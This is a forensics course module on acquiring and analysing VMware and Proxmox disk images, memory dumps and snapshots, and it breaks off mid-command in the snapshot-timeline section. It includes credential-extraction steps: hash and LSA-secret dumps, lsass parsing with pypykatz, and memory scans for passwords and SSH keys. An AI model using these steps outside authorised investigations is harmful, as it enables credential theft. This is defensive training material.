# Digital Forensics in Virtual Environments — Evidence Collection, Analysis, and Investigation

> **Course module:** VMware → Proxmox VE Migration
> **Position in track:** Phase 9 — Security Operations · Module 23
> **Prerequisites:** modules 01-19 (full technical curriculum); module 12 (security & compliance); familiarity with DFIR fundamentals (chain of custody, evidence integrity, forensic imaging); working knowledge of `qm`, `qemu-img`, Linux CLI, hypervisor administration; understanding of MITRE ATT&CK framework.
> **Learning objectives.** Upon completion of this module the student will be able to:
> 1. acquire **disk images** from VMware and Proxmox VMs in forensically sound manner, preserving evidence integrity;
> 2. perform **memory forensics** on running and suspended VMs using Volatility 3, identifying malware, injected code, and extracted credentials;
> 3. analyze **snapshot chains** to reconstruct timelines of attacker activity across VMware and QEMU/Proxmox environments;
> 4. capture and analyze **virtual network traffic** using port mirroring, bridge-level tcpdump, and flow analysis;
> 5. parse and correlate **hypervisor logs** (ESXi vmkernel/hostd/vpxa, Proxmox pveproxy/pvedaemon/systemd journal) to reconstruct VM lifecycle events;
> 6. identify **anti-forensic techniques** specific to virtualized environments and develop countermeasures;
> 7. integrate virtual forensics into a structured **incident response** workflow with legally defensible chain of custody;
> 8. execute a **complete forensic investigation** of a compromised VM in a Proxmox cluster, producing a court-ready forensic report.
> **Estimated time:** reading 120-180 min · lab execution 6-12 hours · report writing 4-8 hours
> **Level:** proficient → expert (Dreyfus 4 → 5)
> **Last updated:** 2026-05-07
> **Reference versions:** Proxmox VE 8.x; QEMU 8.x; Volatility 3.x (framework 2.x release line); libguestfs 1.50+; VMware ESXi 7.0/8.0; Sleuth Kit 4.12+; Plaso/log2timeline 20240101+

---

## Concept Map

```
+=======================================================================+
|         Digital Forensics in Virtual Environments                      |
+=======================================================================+
|                                                                       |
|   EVIDENCE SOURCES               ANALYSIS TOOLS                       |
|   +-----------------+            +-----------------------+            |
|   | VM Disk Images  |----------->| libguestfs / TSK      |            |
|   | .vmdk .qcow2    |            | Autopsy / Sleuth Kit  |            |
|   | .vhd  .vhdx     |            +-----------------------+            |
|   +-----------------+                                                 |
|                                                                       |
|   +-----------------+            +-----------------------+            |
|   | VM Memory Dumps |----------->| Volatility 3          |            |
|   | .vmem .vmsn     |            | Rekall (legacy)       |            |
|   | ELF core dumps  |            +-----------------------+            |
|   +-----------------+                                                 |
|                                                                       |
|   +-----------------+            +-----------------------+            |
|   | Snapshots       |----------->| qemu-img / vmware-    |            |
|   | delta chains    |            |   vdiskmanager        |            |
|   | .vmsd metadata  |            | Timeline analysis     |            |
|   +-----------------+            +-----------------------+            |
|                                                                       |
|   +-----------------+            +-----------------------+            |
|   | Network Capture |----------->| Wireshark / tcpdump   |            |
|   | vSwitch mirrors |            | Zeek / Suricata       |            |
|   | OVS flow tables |            +-----------------------+            |
|   +-----------------+                                                 |
|                                                                       |
|   +-----------------+            +-----------------------+            |
|   | Hypervisor Logs |----------->| Plaso / log2timeline  |            |
|   | vmkernel, hostd |            | Splunk / ELK / Loki   |            |
|   | pvedaemon, QMP  |            | grep / jq / custom    |            |
|   +-----------------+            +-----------------------+            |
|                                                                       |
|   WORKFLOW: Acquire → Verify hash → Analyze → Correlate → Report     |
|                                                                       |
|   LEGAL: Chain of custody → Court admissibility → Expert testimony    |
+=======================================================================+
```

---

## Table of Contents

1. [Challenges of Virtual Forensics](#1-challenges-of-virtual-forensics)
2. [VM Disk Image Forensics](#2-vm-disk-image-forensics)
3. [VM Memory Forensics](#3-vm-memory-forensics)
4. [Snapshot Forensics](#4-snapshot-forensics)
5. [Network Forensics in Virtual Environments](#5-network-forensics-in-virtual-environments)
6. [Hypervisor Log Analysis](#6-hypervisor-log-analysis)
7. [Cloud and Virtualization-Specific Artifacts](#7-cloud-and-virtualization-specific-artifacts)
8. [Anti-Forensics in Virtual Environments](#8-anti-forensics-in-virtual-environments)
9. [Incident Response Integration](#9-incident-response-integration)
10. [Lab: Complete Virtual Forensics Investigation](#10-lab-complete-virtual-forensics-investigation)

---

## 1. Challenges of Virtual Forensics

### 1.1 Volatile vs Non-Volatile Evidence in VMs

Traditional forensics distinguishes between volatile evidence (RAM, running processes, network connections, kernel state) and non-volatile evidence (disk contents, log files, configuration). Virtualization adds a third dimension: the hypervisor layer holds evidence that exists in neither the guest's volatile nor non-volatile storage. The hypervisor's process memory contains the VM's physical memory mapping, virtual device state, and emulated hardware configuration — all of which vanish if the hypervisor process terminates.

Key volatility considerations for virtual environments:

| Evidence Type | Volatility | Location | Acquisition Window |
|---|---|---|---|
| Guest RAM | High | Hypervisor process (QEMU) / `.vmem` | Seconds — lost on power-off |
| Guest disk (live) | Medium | Backing store (`.qcow2` / `.vmdk`) | Stable while VM runs, changes continuously |
| Guest disk (snapshot) | Low | Snapshot delta files | Stable until snapshot deletion |
| Virtual NIC state | High | Hypervisor memory / OVS flow tables | Lost on VM migration or restart |
| Hypervisor logs | Medium | Host filesystem, syslog, journal | Rotated on schedule (hours to days) |
| vSwitch config | Low | Host config files | Stable until reconfig |
| Snapshot metadata | Low | `.vmsd` / `qemu-img info` | Stable until snapshot operations |

**Critical principle:** Always acquire volatile evidence first. The order of volatility in virtual environments is: guest memory → guest network state → hypervisor process state → guest disk (live) → hypervisor logs → snapshot chain → host disk. This mirrors the RFC 3227 order adapted for virtualized infrastructure.

### 1.2 Ephemeral Containers and Evidence Loss

Container workloads running inside VMs (Docker, Podman, LXC within a Proxmox guest) compound the volatility problem. Container filesystems are typically overlay mounts — the writable layer is ephemeral and destroyed on container removal. Evidence within containers includes:

- **Container layer diffs** — files modified during the container's lifetime exist only in the upperdir of the overlay filesystem. If the container is removed (`docker rm`), the upperdir is deleted. Acquisition must target `/var/lib/docker/overlay2/<id>/diff/` or equivalent before container destruction.
- **Container logs** — stored by the logging driver (json-file by default in Docker), typically at `/var/lib/docker/containers/<id>/<id>-json.log`. These survive container removal only if the logging driver persists them externally.
- **Container network namespaces** — each container may have its own network namespace with iptables rules, routing tables, and connection state. The namespace is destroyed when the container exits. Capture with `nsenter --target <pid> --net -- ss -tlnp` and `nsenter --target <pid> --net -- iptables-save` before stopping.
- **Orchestrator metadata** — Kubernetes etcd, Docker Swarm raft logs, and Podman database (`/var/lib/containers/storage/`) contain scheduling decisions, image pull records, and configuration that may be forensically relevant.

**Mitigation strategy:** Implement a forensic-ready architecture. Configure external log aggregation (syslog to a WORM-capable log server), enable Docker content trust for image provenance, use volume mounts for data that must survive container lifecycle, and maintain container image registries with immutable tags for post-incident comparison.

### 1.3 Live vs Dead Acquisition Tradeoffs

| Approach | Advantages | Disadvantages |
|---|---|---|
| **Live acquisition** (VM running) | Captures volatile state: memory, processes, network connections, decrypted volumes | Modifies evidence (memory allocator activity, log writes, filesystem timestamps); attacker may detect acquisition and trigger anti-forensic routines; requires hypervisor-level access |
| **Dead acquisition** (VM powered off) | Stable, reproducible image; no risk of evidence modification during acquisition; simpler chain of custody argument | Loses all volatile evidence; encrypted volumes may be inaccessible without keys; some malware exists only in memory (fileless) |
| **Snapshot-based acquisition** (VM paused + snapshot) | Best compromise — captures memory state and disk atomically; VM can resume after snapshot; minimal impact on production | Snapshot creation itself modifies hypervisor metadata; large snapshots consume storage; snapshot may not capture all virtual device state |

**Recommended approach for production incidents:** Take a snapshot (which captures both memory and disk state atomically), acquire the snapshot files, then resume the VM to minimize business impact. The snapshot provides a forensically useful point-in-time image without the permanence of a full shutdown.

### 1.4 Multi-Tenant Cloud Forensics Complications

In multi-tenant environments (public cloud, shared Proxmox clusters serving multiple clients), forensic investigations face unique obstacles:

- **Jurisdictional boundaries** — the physical hardware may reside in a different legal jurisdiction than the tenant. Evidence acquisition may require international legal cooperation (MLAT, EU EDES regulation). The Budapest Convention on Cybercrime (2001) and its Second Additional Protocol (2022) provide frameworks, but practical implementation varies widely.
- **Shared infrastructure artifacts** — hypervisor logs, network flow data, and storage controller logs may contain data from multiple tenants. Extracting evidence for one tenant without exposing another tenant's data requires careful scoping and, frequently, provider cooperation.
- **Provider dependency** — the cloud provider controls the hypervisor layer. The tenant typically cannot acquire hypervisor memory, host-level logs, or physical disk images directly. AWS, Azure, and GCP each offer forensic capabilities (EBS snapshots, Azure Disk Snapshot, GCE disk cloning), but hypervisor-level artifacts remain inaccessible.
- **Data sovereignty** — GDPR Article 48 restricts transfers of personal data to third-country authorities. A forensic image containing EU personal data cannot simply be shipped to a US-based DFIR lab without appropriate safeguards (SCCs, adequacy decisions, or derogations under Article 49).
- **Ephemeral infrastructure** — autoscaling groups, spot instances, and serverless functions may have already been terminated by the time the investigation begins. Evidence preservation requires proactive measures: immutable logging, flow log retention policies, and forensic hold procedures.

### 1.5 Anti-Forensics in Virtualized Environments (Overview)

Virtualization introduces anti-forensic vectors that do not exist in physical environments. These are covered in depth in Section 8, but the high-level categories are:

- **Snapshot deletion** — destroying the snapshot chain eliminates delta files that recorded attacker modifications.
- **VM-aware malware** — malware that detects it is running inside a VM and alters its behavior (e.g., becomes dormant, deletes payloads, or modifies its persistence mechanism).
- **Hypervisor-level rootkits** — theoretical and demonstrated (Blue Pill, SubVirt) attacks that compromise the hypervisor itself, rendering guest-level forensics unreliable.
- **Thin-provisioned storage** — `TRIM`/`DISCARD` operations on thin-provisioned storage (qcow2, thin LVM) return zeroed blocks to the storage pool, making file carving from unallocated space significantly less effective than on thick-provisioned or physical disks.
- **VM migration** — live migration moves a VM's memory and disk state to another host, potentially crossing jurisdictional boundaries and complicating chain of custody.

### 1.6 Legal Considerations for Cloud-Based Evidence

Forensic evidence from virtual environments must satisfy the same legal standards as physical evidence. Key considerations:

- **Chain of custody** — every acquisition, transfer, and analysis step must be documented with timestamps (UTC ISO 8601), cryptographic hashes (SHA-256 minimum), and custodian identification. Virtual evidence is particularly susceptible to challenges because it is trivially copyable and modifiable.
- **Best evidence rule** — courts may challenge whether a forensic copy of a VM disk image constitutes the "best evidence" when the original still exists on the hypervisor. Document the acquisition methodology and hash verification to establish that the copy is a faithful reproduction.
- **Authentication** — Federal Rules of Evidence Rule 901(b)(9) (US) allows authentication of digital evidence through process or system description. Document the tools used (versions, configurations), the acquisition commands, and the verification steps.
- **Hearsay considerations** — automated logs may be admissible as business records (FRE 803(6)) or as records of regularly conducted activity, but the foundation must be laid by someone with knowledge of the logging system's operation.
- **Expert witness qualification** — virtual forensics requires expertise beyond traditional DFIR. The examiner must be prepared to explain hypervisor architecture, snapshot mechanics, and virtual disk formats to a judge or jury.
- **CLOUD Act (US, 2018)** — authorizes US law enforcement to compel US-based providers to produce data regardless of storage location. This can conflict with GDPR and other data sovereignty frameworks.
- **NIS2 Directive (EU, 2022/2555)** — imposes incident reporting obligations (24-hour early warning, 72-hour incident notification) that may require rapid forensic triage before a full investigation is feasible.

---

## 2. VM Disk Image Forensics

### 2.1 VMDK Format Internals

The Virtual Machine Disk (VMDK) format, originally developed by VMware, uses a descriptor file and one or more extent files. The descriptor is a plain-text file specifying the virtual disk geometry, extent layout, and adapter type.

**VMDK variants:**

| Type | Description | Forensic Implications |
|---|---|---|
| **monolithicSparse** | Single file, allocates clusters on write | Unallocated regions contain no data — file carving limited to allocated clusters |
| **monolithicFlat** | Single file, fully pre-allocated | Entire virtual disk space exists on host — full file carving possible |
| **twoGbMaxExtentSparse** | Multiple 2GB sparse extents | Must reassemble all extents for complete analysis |
| **twoGbMaxExtentFlat** | Multiple 2GB flat extents | Reassembly required but all data present |
| **vmfsSparse** (delta) | Copy-on-write overlay for snapshots | Contains only changed blocks — must be analyzed with parent |
| **seSparse** (space-efficient sparse) | Improved sparse format for large disks | Uses grain directories and grain tables with space reclamation |
| **streamOptimized** | Compressed for OVA/OVF export | Must be decompressed before analysis |

**VMDK sparse file structure:**

```
+-------------------+
| Sparse Header     |  512 bytes — magic, version, grain size, descriptor offset
+-------------------+
| Descriptor        |  Embedded text descriptor (createType, extent descriptions)
+-------------------+
| Redundant GD      |  Backup grain directory
+-------------------+
| Grain Directory   |  Array of pointers to grain tables
+-------------------+
| Grain Tables      |  Arrays of pointers to grains (data clusters)
+-------------------+
| Grains (data)     |  Actual disk data in 64KB (default) clusters
+-------------------+
| End-of-stream     |  Marker for streamOptimized format
+-------------------+
```

The default grain size is 128 sectors (64 KB). Each grain table entry maps a virtual grain to a physical offset in the extent file. Zero entries indicate unallocated grains — the virtual disk returns zeroes for reads to these regions.

**Examining VMDK structure:**

```bash
# Read the descriptor (first few KB of a monolithicSparse VMDK)
head -50 vm-disk.vmdk

# Use qemu-img to inspect
qemu-img info vm-disk.vmdk

# Use vmware-vdiskmanager (if available) to check consistency
vmware-vdiskmanager -R vm-disk.vmdk
```

### 2.2 qcow2 Format Internals

QEMU Copy-On-Write version 2 (qcow2) is the native disk format for QEMU/KVM and therefore Proxmox VE. It supports internal snapshots, compression, encryption, and backing files.

**qcow2 on-disk layout:**

```
+-------------------+
| Header            |  72+ bytes — magic (QFI\xfb), version, backing file offset,
|                   |  cluster_bits, size, crypt_method, L1 table offset/size,
|                   |  refcount table offset/clusters, nb_snapshots, snapshot offset
+-------------------+
| L1 Table          |  Array of 64-bit entries pointing to L2 tables
+-------------------+
| L2 Tables         |  Each L2 table covers (cluster_size / 8) clusters
|                   |  Each entry: offset to data cluster + flags (compressed, zero)
+-------------------+
| Refcount Table    |  Tracks reference counts for each cluster
+-------------------+
| Refcount Blocks   |  Actual refcount values (16-bit default, configurable)
+-------------------+
| Data Clusters     |  Actual guest data (default cluster size: 64 KB)
+-------------------+
| Snapshot Table    |  Internal snapshot metadata (L1 table copies)
+-------------------+
```

**Key forensic properties:**

- **Backing files** — a qcow2 file can reference a backing file (parent image). Reads to unmodified clusters are redirected to the backing file. This is the mechanism for both templates and external snapshots. The backing file path is stored in the header.
- **Internal snapshots** — stored within the qcow2 file as additional L1 table copies. Each snapshot preserves the L1-to-L2 mapping at the time of creation. Clusters modified after the snapshot get new allocations; the snapshot's L1 table still points to the original clusters.
- **Compression** — individual clusters can be compressed with zlib (or zstd in newer QEMU). Compressed clusters are indicated by a flag in the L2 entry. Forensic tools must decompress these clusters for analysis.
- **Encryption** — qcow2 supports LUKS encryption (format version 3+). Encrypted images require the key before any forensic analysis is possible.
- **Refcount** — tracks how many references (including snapshots) point to each cluster. Clusters with refcount 0 are free — but may still contain residual data from previous allocations (forensically relevant for file carving).

**Examining qcow2 structure:**

```bash
# Detailed info including snapshot list and backing chain
qemu-img info --backing-chain vm-disk.qcow2

# Check consistency
qemu-img check vm-disk.qcow2

# List internal snapshots
qemu-img snapshot -l vm-disk.qcow2

# Dump qcow2 header (requires qemu-img with --output=json)
qemu-img info --output=json vm-disk.qcow2 | jq .
```

### 2.3 VHD/VHDX Format

While less common in VMware-to-Proxmox migrations, VHD (Virtual Hard Disk) and VHDX (Hyper-V Virtual Hard Disk v2) images may be encountered when migrating from Hyper-V or when dealing with Azure-originated workloads.

**VHD** uses a footer at the end of the file containing disk geometry, disk type (fixed/dynamic/differencing), and a unique identifier. Dynamic VHD uses a Block Allocation Table (BAT) mapping virtual blocks to file offsets. The default block size is 2 MB.

**VHDX** improves on VHD with support for disks larger than 2 TB (up to 64 TB), 4 KB logical sector sizes, resilience against power failure via a log/journal structure, and a metadata region for custom properties. Block size is configurable (1 MB to 256 MB).

Forensic relevance: differencing VHD/VHDX files function analogously to VMDK delta files and qcow2 backing chains — they record only changed blocks relative to a parent. Analysis requires the complete chain.

### 2.4 Converting Between Formats for Analysis

Forensic tools often work best with raw disk images. Converting virtual disk formats to raw enables analysis with standard tools (The Sleuth Kit, Autopsy, fdisk, mount).

```bash
# VMDK to raw
qemu-img convert -f vmdk -O raw vm-disk.vmdk vm-disk.raw

# qcow2 to raw (includes applying backing chain)
qemu-img convert -f qcow2 -O raw vm-disk.qcow2 vm-disk.raw

# VHD to raw
qemu-img convert -f vpc -O raw vm-disk.vhd vm-disk.raw

# VHDX to raw
qemu-img convert -f vhdx -O raw vm-disk.vhdx vm-disk.raw

# Verify conversion integrity — compare virtual size
qemu-img info vm-disk.raw
qemu-img info vm-disk.qcow2

# Hash the raw output for chain of custody
sha256sum vm-disk.raw > vm-disk.raw.sha256
```

**Important:** `qemu-img convert` for qcow2 with backing files automatically merges the entire chain into the output. If you need to analyze individual delta layers, copy them separately and analyze with backing chain awareness.

For VMDK files with snapshots (delta chains), you must convert the full chain:

```bash
# Identify the chain — the current disk descriptor references the delta chain
grep parentFileNameHint vm-disk-000002.vmdk

# Convert the tip of the chain (includes all parent data)
qemu-img convert -f vmdk -O raw vm-disk-000002.vmdk vm-disk-full.raw
```

### 2.5 Mounting VM Disks for Forensic Analysis

#### libguestfs / guestmount

libguestfs provides userspace tools for accessing VM disk images without requiring root access or loop device setup. It launches a small appliance (a minimal Linux VM) that mounts the disk internally and exports it via FUSE.

```bash
# Mount a qcow2 image read-only (forensically sound)
# -a: add disk image, -i: auto-inspect to find OS and mount points, --ro: read-only
guestmount -a /evidence/vm-disk.qcow2 -i --ro /mnt/forensic

# Mount a specific partition (if auto-inspect fails)
# First, list partitions:
virt-filesystems -a /evidence/vm-disk.qcow2 --long --human-readable

# Then mount a specific partition:
guestmount -a /evidence/vm-disk.qcow2 -m /dev/sda1:/ --ro /mnt/forensic

# Inspect the guest OS without mounting
virt-inspector -a /evidence/vm-disk.qcow2

# List files in a directory
virt-ls -a /evidence/vm-disk.qcow2 -R /etc/

# Read a specific file
virt-cat -a /evidence/vm-disk.qcow2 /etc/passwd

# Extract guest OS logs
virt-log -a /evidence/vm-disk.qcow2

# Extract all files matching a pattern
virt-copy-out -a /evidence/vm-disk.qcow2 /var/log /evidence/extracted-logs/

# Unmount when done
guestunmount /mnt/forensic
```

#### Arsenal Image Mounter (Windows)

For Windows-based forensic workstations, Arsenal Image Mounter can mount VMDK, VHD, VHDX, and raw images as physical or logical disks, enabling analysis with Windows forensic tools (EnCase, FTK, X-Ways).

#### Loop device mounting (raw images)

```bash
# For raw images, find partition offsets
fdisk -l vm-disk.raw

# Mount a partition (read-only, noexec for safety)
# Offset = start_sector * sector_size (typically 512)
mount -o ro,noexec,offset=$((2048*512)) vm-disk.raw /mnt/forensic

# For LVM inside the raw image
kpartx -av vm-disk.raw    # creates /dev/mapper/loop0p1, etc.
vgscan
vgchange -ay
mount -o ro,noexec /dev/mapper/vgname-lvname /mnt/forensic
```

### 2.6 Filesystem-Level Analysis of Mounted Images

Once mounted, standard forensic analysis applies:

```bash
# Timeline generation with The Sleuth Kit
fls -r -m "/" /dev/loop0p1 > bodyfile.txt
mactime -b bodyfile.txt -d > timeline.csv

# File system metadata
fsstat /dev/loop0p1

# Deleted file recovery
fls -r -d /dev/loop0p1

# Specific inode analysis
istat /dev/loop0p1 <inode_number>

# File carving from unallocated space (on the raw image)
photorec /d /evidence/carved/ vm-disk.raw

# Hash all files for baseline comparison
find /mnt/forensic -type f -exec sha256sum {} \; > file_hashes.txt

# Search for known bad hashes (NSRL, custom IOC hash lists)
# Compare against hashset:
hashdeep -r -m -k known_bad.txt /mnt/forensic
```

---

## 3. VM Memory Forensics

### 3.1 Hypervisor Memory Dump Acquisition

#### VMware — `.vmem` and `.vmsn` Files

When a VMware VM is suspended, the hypervisor writes the guest's physical memory to a `.vmem` file alongside the configuration. When a snapshot includes memory, the memory state is saved in a `.vmsn` file (or the `.vmem` is created alongside the snapshot).

```
/vmfs/volumes/datastore1/vm-name/
├── vm-name.vmx                    # VM configuration
├── vm-name-flat.vmdk              # Disk data
├── vm-name.vmdk                   # Disk descriptor
├── vm-name-Snapshot1.vmsn         # Snapshot state (may include memory)
├── vm-name-000001.vmdk            # Delta disk for snapshot 1
├── vm-name-000001-delta.vmdk      # Delta extent
├── vm-name.vmem                   # Suspended VM memory (if suspended)
└── vm-name.vmsd                   # Snapshot dictionary
```

Acquisition steps:

```bash
# On ESXi host — copy the .vmem file (if VM is suspended)
scp root@esxi:/vmfs/volumes/datastore1/vm-name/vm-name.vmem /evidence/

# Or take a snapshot with memory included (from vSphere or CLI)
vim-cmd vmsvc/snapshot.create <vmid> "forensic-snapshot" \
  "Forensic memory capture" true  # true = include memory

# Hash immediately after acquisition
sha256sum /evidence/vm-name.vmem > /evidence/vm-name.vmem.sha256
```

#### QEMU/Proxmox — Memory Dump via QMP

For QEMU-based VMs (Proxmox VE), memory acquisition uses the QEMU Machine Protocol (QMP) or the Proxmox `qm` interface.

```bash
# Method 1: Via Proxmox qm monitor (enters QMP interactive mode)
qm monitor <vmid>
# Then at the qm> prompt:
dump-guest-memory -p /tmp/vm-<vmid>-mem.elf
# The -p flag produces a paging-aware ELF core dump
# Alternatively for a raw dump:
pmemsave 0 0x100000000 /tmp/vm-<vmid>-mem.raw
# (0x100000000 = 4 GB; adjust to VM memory size)

# Method 2: Direct QMP socket (if accessible)
echo '{"execute": "dump-guest-memory", "arguments": {"paging": true, "protocol": "file:/tmp/vm-mem.elf"}}' | \
  socat - UNIX-CONNECT:/var/run/qemu-server/<vmid>.qmp

# Method 3: Using virsh (if libvirt is in use)
virsh dump <domain> /evidence/vm-mem.elf --memory-only --format elf

# Method 4: LiME from inside the guest (agent-based)
# Requires kernel module insertion — more invasive
insmod lime-$(uname -r).ko "path=/evidence/mem.lime format=lime"

# Method 5: AVML (Microsoft's Acquire Virtual Memory for Linux)
# Static binary, no kernel module needed, uses /proc/kcore
./avml /evidence/mem.lime

# Hash the dump
sha256sum /tmp/vm-<vmid>-mem.elf > /tmp/vm-<vmid>-mem.elf.sha256
```

**Proxmox-specific considerations:**

- QEMU processes run as `root` on the Proxmox host. The QMP socket is at `/var/run/qemu-server/<vmid>.qmp`.
- Memory dumps can be very large (equal to VM RAM size). Ensure the target filesystem has sufficient space.
- The `dump-guest-memory` command pauses the VM briefly during the dump. For minimal impact, use the `-p` (paging) flag which produces a smaller ELF core with page table awareness.
- LXC containers on Proxmox share the host kernel — their memory is part of the host's address space. Use host-level tools to analyze container memory regions via `/proc/<pid>/mem` and `/proc/<pid>/maps`.

### 3.2 Volatility 3 with VM Memory

Volatility 3 uses a plugin-based architecture with automatic symbol table resolution. Unlike Volatility 2 (which required `--profile=`), Volatility 3 auto-detects the OS via ISF (Intermediate Symbol Format) files.

**Installation and symbol tables:**

```bash
# Install Volatility 3
pip install volatility3

# Download symbol tables (ISF packs)
# Windows symbols — from Microsoft Symbol Server (automatic)
# Linux symbols — generate from the target kernel's debug symbols:
# On the target system (before compromise, ideally):
dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-$(uname -r) > linux-symbols.json
# Place in volatility3/symbols/linux/
```

**Core analysis commands:**

```bash
# Process listing
vol -f /evidence/vm-mem.elf linux.pslist.PsList
vol -f /evidence/vm-mem.elf windows.pslist.PsList

# Process tree (parent-child relationships)
vol -f /evidence/vm-mem.elf windows.pstree.PsTree

# Detect hidden/injected processes
vol -f /evidence/vm-mem.elf windows.malfind.Malfind
vol -f /evidence/vm-mem.elf linux.malfind.Malfind

# Network connections
vol -f /evidence/vm-mem.elf windows.netscan.NetScan
vol -f /evidence/vm-mem.elf linux.sockstat.Sockstat

# Command line arguments
vol -f /evidence/vm-mem.elf windows.cmdline.CmdLine

# DLL listing
vol -f /evidence/vm-mem.elf windows.dlllist.DllList

# File scan (find file objects in memory)
vol -f /evidence/vm-mem.elf windows.filescan.FileScan

# Dump suspicious processes
vol -f /evidence/vm-mem.elf windows.dumpfiles.DumpFiles --pid <pid>

# Registry analysis
vol -f /evidence/vm-mem.elf windows.registry.hivelist.HiveList
vol -f /evidence/vm-mem.elf windows.registry.printkey.PrintKey \
  --key "Software\Microsoft\Windows\CurrentVersion\Run"

# Linux-specific: bash history from memory
vol -f /evidence/vm-mem.elf linux.bash.Bash

# Linux-specific: loaded kernel modules
vol -f /evidence/vm-mem.elf linux.check_modules.Check_modules

# Linux-specific: check for syscall hooks (rootkit indicator)
vol -f /evidence/vm-mem.elf linux.check_syscall.Check_syscall

# YARA scanning in memory
vol -f /evidence/vm-mem.elf yarascan.YaraScan --yara-file /rules/malware.yar
```

### 3.3 Analyzing VM Memory for Malware and Rootkits

**Fileless malware detection workflow:**

1. **Process anomalies** — compare `pslist` (which reads the active process list / EPROCESS linked list) with `psscan` (which scans for process structures in all of memory). Discrepancies indicate hidden processes (DKOM — Direct Kernel Object Manipulation). On Linux, compare `pslist` with `psaux`.

2. **Malfind analysis** — the `malfind` plugin identifies memory regions with executable permissions that were not loaded from a file on disk. These regions often contain injected shellcode, reflective DLLs, or process hollowing payloads. Key indicators:
   - `PAGE_EXECUTE_READWRITE` protection on anonymous (non-file-backed) memory
   - MZ/PE headers in non-image regions
   - Executable regions within the heap or stack

3. **Kernel integrity** — for rootkit detection:
   - `linux.check_syscall` — verifies that system call table entries point to expected kernel text addresses
   - `linux.check_modules` — compares loaded module list with actual module structures in memory
   - `linux.hidden_modules` — finds modules that removed themselves from the loaded module list
   - `windows.ssdt.SSDT` — dumps the System Service Descriptor Table, highlights hooks

4. **Code injection techniques** (MITRE ATT&CK T1055):
   - Process hollowing (T1055.012) — `malfind` shows executable code in a legitimate process name
   - DLL injection (T1055.001) — `dlllist` shows unexpected DLLs; compare against known-good baseline
   - Thread execution hijacking (T1055.003) — examine thread start addresses in `threads` plugin

### 3.4 Extracting Credentials from VM Memory

**Windows credential extraction:**

```bash
# Dump cached credentials (NTLM hashes from SAM hive)
vol -f /evidence/vm-mem.elf windows.hashdump.Hashdump

# Dump cached domain credentials (from SECURITY hive)
vol -f /evidence/vm-mem.elf windows.cachedump.Cachedump

# Dump LSA secrets
vol -f /evidence/vm-mem.elf windows.lsadump.Lsadump

# For Mimikatz-style extraction, dump lsass.exe memory and analyze offline:
vol -f /evidence/vm-mem.elf windows.dumpfiles.DumpFiles --pid <lsass_pid>
# Then use pypykatz on the dump:
pypykatz lsa minidump lsass_dump.dmp
```

**Linux credential extraction:**

```bash
# Extract bash history (may contain passwords in commands)
vol -f /evidence/vm-mem.elf linux.bash.Bash

# Search for password patterns in memory
vol -f /evidence/vm-mem.elf yarascan.YaraScan \
  --yara-rules 'rule passwords { strings: $a = "password=" $b = "passwd=" $c = "PASS=" condition: any of them }'

# SSH keys — scan for PEM headers
vol -f /evidence/vm-mem.elf yarascan.YaraScan \
  --yara-rules 'rule ssh_keys { strings: $a = "-----BEGIN OPENSSH PRIVATE KEY-----" $b = "-----BEGIN RSA PRIVATE KEY-----" condition: any of them }'
```

**Forensic note:** credential extraction from memory is extremely sensitive. Document every step, hash every output, and restrict access to extracted credentials. In many jurisdictions, possessing or using extracted credentials outside the authorized investigation scope is a criminal offense.

---

## 4. Snapshot Forensics

### 4.1 VMware Snapshot Architecture

VMware snapshots create a delta chain where each snapshot adds a new layer:

```
Base disk (vm-flat.vmdk)
  └── Snapshot 1 delta (vm-000001.vmdk + vm-000001-delta.vmdk)
        └── Snapshot 2 delta (vm-000002.vmdk + vm-000002-delta.vmdk)
              └── Current state (writes go here)
```

Associated files:

| File | Purpose | Forensic Value |
|---|---|---|
| `vm-name.vmsd` | Snapshot dictionary — lists all snapshots, their IDs, display names, creation timestamps, and parent-child relationships | Timeline of snapshot operations; shows deleted snapshot gaps |
| `vm-name-SnapshotN.vmsn` | Snapshot state file — VM configuration and (optionally) memory state at snapshot time | Memory forensics at historical point in time |
| `vm-name-00000N.vmdk` | Descriptor for delta disk N | References parent disk and delta extent |
| `vm-name-00000N-delta.vmdk` | Actual changed blocks since parent snapshot | Contains only modified sectors — shows exactly what changed |

**Parsing the `.vmsd` file:**

```bash
# The .vmsd is a plain-text dictionary
cat vm-name.vmsd

# Example content:
# .encoding = "UTF-8"
# snapshot.lastUID = "3"
# snapshot.numSnapshots = "2"
# snapshot0.uid = "1"
# snapshot0.filename = "vm-name-Snapshot1.vmsn"
# snapshot0.displayName = "Before patching"
# snapshot0.createTimeHigh = "421234"
# snapshot0.createTimeLow = "-1234567890"
# snapshot0.numDisks = "1"
# snapshot0.disk0.fileName = "vm-name-000001.vmdk"
# snapshot1.uid = "2"
# snapshot1.filename = "vm-name-Snapshot2.vmsn"
# snapshot1.displayName = "After suspicious activity"
# snapshot1.createTimeHigh = "421235"
# snapshot1.createTimeLow = "987654321"
```

### 4.2 Proxmox/QEMU Snapshots — Internal vs External

QEMU supports two snapshot types with fundamentally different forensic characteristics:

**Internal snapshots** — stored within a single qcow2 file. The snapshot is an additional L1 table reference within the same file. No new files are created.

```bash
# List internal snapshots
qemu-img snapshot -l vm-disk.qcow2

# Example output:
# Snapshot list:
# ID  TAG              VM SIZE   DATE               VM CLOCK    ICOUNT
# 1   clean-install    4.2G      2026-01-15 10:30:00  05:32:18.654
# 2   post-update      4.5G      2026-02-20 14:45:00  12:01:42.001
# 3   pre-incident     4.5G      2026-03-10 09:00:00  18:44:55.230

# Apply (revert to) a snapshot for analysis (ON A FORENSIC COPY, never the original)
qemu-img snapshot -a clean-install vm-disk-forensic-copy.qcow2
```

**External snapshots** — create a new qcow2 file that uses the original as a backing file. This is what Proxmox uses by default for live snapshots.

```bash
# Proxmox creates external snapshots via:
qm snapshot <vmid> <snapname>

# This creates a new overlay file:
# /var/lib/vz/images/<vmid>/vm-<vmid>-disk-0.qcow2  (becomes backing/read-only)
# /var/lib/vz/images/<vmid>/vm-<vmid>-disk-0.qcow2.snap.XYZ  (new active overlay)

# Examine the backing chain
qemu-img info --backing-chain /var/lib/vz/images/<vmid>/vm-<vmid>-disk-0.qcow2

# Proxmox stores snapshot metadata in the VM configuration
cat /etc/pve/qemu-server/<vmid>.conf
# Look for [snapname] sections with timestamp and description
```

### 4.3 Forensic Timeline from Snapshot Chain

Snapshots provide natural forensic waypoints. By comparing the filesystem state at each snapshot, you can bound the time window of specific changes.

**Methodology:**

```bash
# 1. Convert each snapshot layer to raw (or mount each independently)
# For internal snapshots, apply each to a separate copy:
for snap in clean-install post-update pre-incident; do
